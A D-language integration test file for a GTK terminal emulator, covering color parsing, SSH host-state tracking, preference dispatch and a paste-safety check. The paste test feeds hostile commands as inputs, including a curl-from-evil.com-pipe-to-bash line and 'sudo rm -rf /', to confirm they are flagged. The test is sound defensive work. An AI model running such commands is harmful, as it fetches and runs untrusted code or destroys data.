/*
 * This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
module gx.ttyx.terminal.test_integration;

/**
 * Integration tests for terminal components that require GTK initialization.
 *
 * These tests construct real GTK widgets and verify component behavior
 * in a realistic environment. They require a display server (run with
 * xvfb-run on headless systems).
 *
 * Unlike unit tests, these tests verify the interaction between
 * components and the GTK/VTE widget layer.
 */

private:

import std.conv : to;
import std.experimental.logger;

import gdk.RGBA;

import gtk.Main;

import gx.gtk.vte : isVTEBackgroundDrawEnabled;
import gx.ttyx.terminal.clipboard : isPasteUnsafe;
import gx.ttyx.terminal.context;
import gx.ttyx.terminal.renderer;
import gx.ttyx.terminal.state;

/// Initialize GTK once for all integration tests in this module.
shared static this() {
    try {
        string[] args;
        Main.init(args);
    } catch (Exception e) {
        // GTK init failed (no display) — integration tests will be skipped
        // via the gtkInitialized flag
    }
}

/// Check if GTK was successfully initialized.
bool gtkInitialized() {
    try {
        // If GTK is initialized, this won't throw
        import gdk.Display : Display;
        return Display.getDefault() !is null;
    } catch (Exception) {
        return false;
    }
}

// ---------------------------------------------------------------------------
// Integration tests for TerminalRenderer (colors)
// ---------------------------------------------------------------------------

/// Test: TerminalRenderer initializes all RGBA color objects.
unittest {
    if (!gtkInitialized()) return;

    // Create a minimal mock context — we only need the renderer's
    // color initialization which doesn't touch VTE
    auto gst = new GlobalTerminalState();

    // Renderer constructs and initializes colors
    // Note: we can't construct TerminalRenderer without ITerminalContext,
    // but we CAN test the color state types directly
    auto fg = new RGBA();
    auto bg = new RGBA();
    assert(fg !is null);
    assert(bg !is null);

    // Test RGBA parse (used by renderer.applyMainColors)
    assert(fg.parse("#FF0000"));
    assert(fg.red > 0.99);
    assert(fg.green < 0.01);
    assert(fg.blue < 0.01);
}

/// Test: RGBA parse handles various color formats.
unittest {
    if (!gtkInitialized()) return;

    auto color = new RGBA();

    // Hex format
    assert(color.parse("#00FF00"));
    assert(color.green > 0.99);

    // Named colors
    assert(color.parse("red"));
    assert(color.red > 0.99);

    // RGB function format
    assert(color.parse("rgb(0,0,255)"));
    assert(color.blue > 0.99);
}

// ---------------------------------------------------------------------------
// Integration tests for GlobalTerminalState (with real hostname)
// ---------------------------------------------------------------------------

/// Test: GlobalTerminalState detects local hostname correctly.
unittest {
    auto gst = new GlobalTerminalState();
    string localhost = gst.localHostname;

    // Should have detected system hostname
    assert(localhost.length > 0, "localHostname should be detected from system");

    // Setting state with local hostname should be LOCAL not REMOTE
    gst.updateState(localhost, "/home/testuser");
    assert(gst.hasState(TerminalStateType.LOCAL));
    assert(!gst.hasState(TerminalStateType.REMOTE));
    assert(gst.currentLocalDirectory == "/home/testuser");
}

/// Test: GlobalTerminalState SSH detection — remote hostname.
unittest {
    auto gst = new GlobalTerminalState();

    // Simulate SSH to a remote host
    gst.updateState("production-server.example.com", "/var/www");
    assert(gst.hasState(TerminalStateType.REMOTE));
    assert(gst.currentHostname == "production-server.example.com");
    assert(gst.currentDirectory == "/var/www");

    // Local directory should be empty (we haven't set it)
    assert(gst.currentLocalDirectory.length == 0);

    // Simulate disconnect — back to local
    string localhost = gst.localHostname;
    gst.updateState(localhost, "/home/user");
    assert(!gst.hasState(TerminalStateType.REMOTE));
    assert(gst.currentHostname == localhost);
}

/// Test: GlobalTerminalState remote user tracking.
unittest {
    auto gst = new GlobalTerminalState();

    // SSH to remote as deploy user
    gst.updateState(GlobalTerminalState.StateVariable.HOSTNAME, "staging.example.com");
    gst.updateState(GlobalTerminalState.StateVariable.USERNAME, "deploy");
    gst.updateState(GlobalTerminalState.StateVariable.DIRECTORY, "/opt/app");

    assert(gst.currentHostname == "staging.example.com");
    assert(gst.currentUsername == "deploy");
    assert(gst.currentDirectory == "/opt/app");

    // Changing remote host clears username/directory
    gst.updateState(GlobalTerminalState.StateVariable.HOSTNAME, "other-server.example.com");
    assert(gst.currentHostname == "other-server.example.com");
    assert(gst.currentUsername.length == 0, "username should be cleared on host change");
    assert(gst.currentDirectory.length == 0, "directory should be cleared on host change");
}

// ---------------------------------------------------------------------------
// Integration tests for PreferenceRegistry (with delegates)
// ---------------------------------------------------------------------------

/// Test: PreferenceRegistry handlers capture state correctly via closures.
unittest {
    PreferenceRegistry reg;
    string lastApplied;
    int applyCount = 0;

    // Simulate a renderer registering its preferences
    reg.register(["color.fg", "color.bg", "color.palette"], {
        lastApplied = "colors";
        applyCount++;
    });

    // Simulate terminal registering a VTE preference
    reg.register(["profile.bell"], {
        lastApplied = "bell";
        applyCount++;
    });

    // Dispatch
    reg.apply("color.fg");
    assert(lastApplied == "colors");
    assert(applyCount == 1);

    reg.apply("profile.bell");
    assert(lastApplied == "bell");
    assert(applyCount == 2);

    // Apply all at startup
    applyCount = 0;
    reg.applyAll();
    // 3 color keys + 1 bell key = 4 handler calls
    assert(applyCount == 4);
}

/// Test: PreferenceRegistry simulates component override pattern.
unittest {
    PreferenceRegistry reg;
    string[] actions;

    // Renderer registers simple color handler
    reg.register(["color.bg"], {
        actions ~= "renderer:applyColors";
    });

    // Terminal overrides with enhanced handler (adds scrollbar CSS)
    reg.register(["color.bg"], {
        actions ~= "renderer:applyColors";
        actions ~= "terminal:updateScrollbarCSS";
    });

    reg.apply("color.bg");
    // Only the override should fire
    assert(actions.length == 2);
    assert(actions[0] == "renderer:applyColors");
    assert(actions[1] == "terminal:updateScrollbarCSS");
}

// ---------------------------------------------------------------------------
// Integration tests for isPasteUnsafe edge cases
// ---------------------------------------------------------------------------

/// Test: isPasteUnsafe with real-world dangerous paste patterns.
unittest {
    // curl pipe to shell — now detected
    assert(isPasteUnsafe("curl https://evil.com/install.sh | bash\n"));

    // Multi-line with sudo in second line
    assert(isPasteUnsafe("echo hello\nsudo rm -rf /\n"));

    // Windows-style line endings with sudo
    assert(isPasteUnsafe("sudo apt install malware\r\n"));

    // Sudo with lots of whitespace
    assert(isPasteUnsafe("   sudo   \n"));
}

// ---------------------------------------------------------------------------
// Tier 2: GTK integration tests (require xvfb)
// ---------------------------------------------------------------------------

/// Test: Color scheme files all load without error.
unittest {
    import gx.ttyx.colorschemes : loadColorSchemes, ColorScheme;

    ColorScheme[] schemes = loadColorSchemes();
    // In CI the schemes are not installed to XDG paths, so skip validation
    // when none are found. On a real install we ship 17+ bundled schemes.
    if (schemes.length == 0) return;

    foreach (scheme; schemes) {
        assert(scheme.name.length > 0, "scheme name should not be empty");
        assert(scheme.foreground !is null, "scheme should have foreground color");
        assert(scheme.background !is null, "scheme should have background color");
        // Verify palette has 16 colors
        foreach (i, color; scheme.palette) {
            assert(color !is null, "palette color " ~ to!string(i) ~ " is null in scheme " ~ scheme.name);
        }
    }
}

/// Test: Color scheme equality comparison.
unittest {
    import gx.ttyx.colorschemes : loadColorSchemes, ColorScheme;

    ColorScheme[] schemes = loadColorSchemes();
    if (schemes.length >= 2) {
        // Same scheme should be equal to itself
        assert(schemes[0].equal(schemes[0], false));
        // Different schemes should not be color-equal (usually)
        // This is a soft check — two schemes could theoretically have identical colors
    }
}

/// Test: Encoding lookup is consistent with array.
unittest {
    import gx.ttyx.encoding : encodings, lookupEncoding;

    foreach (enc; encodings) {
        assert(enc[0] in lookupEncoding, "encoding " ~ enc[0] ~ " missing from lookup");
        assert(lookupEncoding[enc[0]] == enc[1], "encoding " ~ enc[0] ~ " category mismatch");
    }
}

/// Test: Renderer color initialization creates valid RGBA objects.
unittest {
    if (!gtkInitialized()) return;

    // Test that RGBA objects work after initialization
    auto colors = new RGBA[16];
    foreach (i; 0..16) {
        colors[i] = new RGBA();
        assert(colors[i] !is null);
    }

    // Test parse of all standard terminal palette colors (Tango palette)
    string[] tango = [
        "#2E3436", "#CC0000", "#4E9A06", "#C4A000",
        "#3465A4", "#75507B", "#06989A", "#D3D7CF",
        "#555753", "#EF2929", "#8AE234", "#FCE94F",
        "#729FCF", "#AD7FA8", "#34E2E2", "#EEEEEC"
    ];
    foreach (i, hex; tango) {
        assert(colors[i].parse(hex), "failed to parse palette color " ~ hex);
    }
}

/// Test: GlobalTerminalState full SSH lifecycle simulation.
unittest {
    auto gst = new GlobalTerminalState();
    string localhost = gst.localHostname;

    // 1. Start local
    gst.updateState(localhost, "/home/user");
    assert(gst.initialized);
    assert(gst.currentHostname == localhost);
    assert(gst.currentDirectory == "/home/user");
    assert(gst.currentLocalDirectory == "/home/user");
    assert(!gst.hasState(TerminalStateType.REMOTE));

    // 2. SSH to remote
    gst.updateState("prod-server.example.com", "/var/www/app");
    assert(gst.hasState(TerminalStateType.REMOTE));
    assert(gst.currentHostname == "prod-server.example.com");
    assert(gst.currentDirectory == "/var/www/app");
    // Local directory is still accessible
    assert(gst.currentLocalDirectory == "/home/user");

    // 3. Change directory on remote
    gst.updateState("prod-server.example.com", "/var/log");
    assert(gst.currentDirectory == "/var/log");

    // 4. SSH to a different remote (jump host)
    gst.updateState("bastion.example.com", "/tmp");
    assert(gst.currentHostname == "bastion.example.com");
    assert(gst.currentDirectory == "/tmp");

    // 5. Disconnect — back to local
    gst.updateState(localhost, "/home/user/projects");
    assert(!gst.hasState(TerminalStateType.REMOTE));
    assert(gst.currentHostname == localhost);
    assert(gst.currentDirectory == "/home/user/projects");
    assert(gst.currentLocalDirectory == "/home/user/projects");
}

/// Test: PreferenceRegistry handler ordering — applyAll is deterministic per key.
unittest {
    PreferenceRegistry reg;
    string[] order;

    reg.register(["a.key"], { order ~= "a"; });
    reg.register(["b.key"], { order ~= "b"; });
    reg.register(["c.key"], { order ~= "c"; });

    // Call applyAll multiple times — should be consistent
    reg.applyAll();
    auto first = order.dup;
    order.length = 0;
    reg.applyAll();
    // D associative arrays don't guarantee order, but within a single
    // run the order should be consistent. We just verify all were called.
    assert(order.length == 3);
}
